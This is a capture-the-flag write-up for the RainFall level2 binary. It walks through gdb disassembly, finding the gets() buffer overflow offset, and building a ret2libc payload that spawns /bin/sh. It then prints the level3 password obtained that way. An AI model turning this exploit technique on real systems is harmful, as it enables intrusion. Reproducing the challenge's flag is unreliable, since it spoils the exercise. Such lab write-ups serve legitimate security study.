_Testing the binary_
```
level2@RainFall:~$ ./level2 
df
df
level2@RainFall:~$ ./level2 sdf
sdf
sdf
```

_Disas with gdb_
```
level2@RainFall:~$ gdb ./level2 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.


(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048358  _init
0x080483a0  printf
0x080483a0  printf@plt
0x080483b0  fflush
0x080483b0  fflush@plt
0x080483c0  gets
0x080483c0  gets@plt
0x080483d0  _exit
0x080483d0  _exit@plt
0x080483e0  strdup
0x080483e0  strdup@plt
0x080483f0  puts
0x080483f0  puts@plt
0x08048400  __gmon_start__
0x08048400  __gmon_start__@plt
0x08048410  __libc_start_main
0x08048410  __libc_start_main@plt
0x08048420  _start
0x08048450  __do_global_dtors_aux
0x080484b0  frame_dummy
0x080484d4  p
0x0804853f  main
0x08048550  __libc_csu_init
0x080485c0  __libc_csu_fini
0x080485c2  __i686.get_pc_thunk.bx
0x080485d0  __do_global_ctors_aux
0x080485fc  _fini


(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    
End of assembler dump.


(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.

```

_we have 2 functions. main that calling p, and we see p use gets again. But this time, no shell access in the code. we can still do a buffer overflow attack but this time, overwrite the return adress and redirect the execution flow to a function in the libc library (like system)_
> ret2libc attack

_first we need to check if the ASLR is off_
> cat /proc/sys/kernel/randomize_va_space

_next we verify the start point for the buffer overflow_
```
0x080484e2 <+14>:	call   0x80483c0 <gets@plt>
```

_buffer size_
```
0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
  
  (gdb) print 0x4c
  $1 = 76
```

_buffer offset_
```
(gdb) break *0x080484f2
  Breakpoint 1 at 0x80484f2

  (gdb) run
  Starting program: /home/user/level2/level2 
  randomstring

  Breakpoint 1, 0x080484f2 in p ()

  (gdb) x $eax
  0xbffff5dc: 0xb7ec0061

  (gdb) info frame
  Stack level 0, frame at 0xbffff630:
    eip = 0x80484f2 in p; saved eip 0x804854a
    called by frame at 0xbffff640
    Arglist at 0xbffff628, args:
    Locals at 0xbffff628, Previous frame's sp is 0xbffff630
    Saved registers:
      ebp at 0xbffff628, eip at 0xbffff62c

  (gdb) print 0xbffff62c - 0xbffff5dc
  $1 = 80
```

_now we search for some libc functions adress_
```
   (gdb) print &system
   $1 = (<text variable, no debug info> *) 0xb7e6b060 <system>

   (gdb) print &exit
   $1 = (<text variable, no debug info> *) 0xb7e5ebe0 <exit>

   ret in p: 0x0804853e

   /bin/sh
   (gdb) find &system, +999999999, "/bin/sh"
  0xb7f8cc58
```

_now we can build our payload_
> 80 nop characters
> a ret instruction '\x08\x04\x85\x3e'[::-1] || 'x3e\x85\x04\x08\'
> a system instruction '\xb7\xe6\xb0\x60'[::-1]
> an exit instruction '\xb7\xe5\xeb\xe0'[::-1]
> /bin/sh instruction '\xb7\xf8\xcc\x58'[::-1]
> end with cat to tricks the process

```
(python -c "print '\x90' * 80 + '\x08\x04\x85\x3e'[::-1] + '\xb7\xe6\xb0\x60'[::-1] + '\xb7\xe5\xeb\xe0'[::-1] + '\xb7\xf8\xcc\x58'[::-1]"; cat) | ./level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
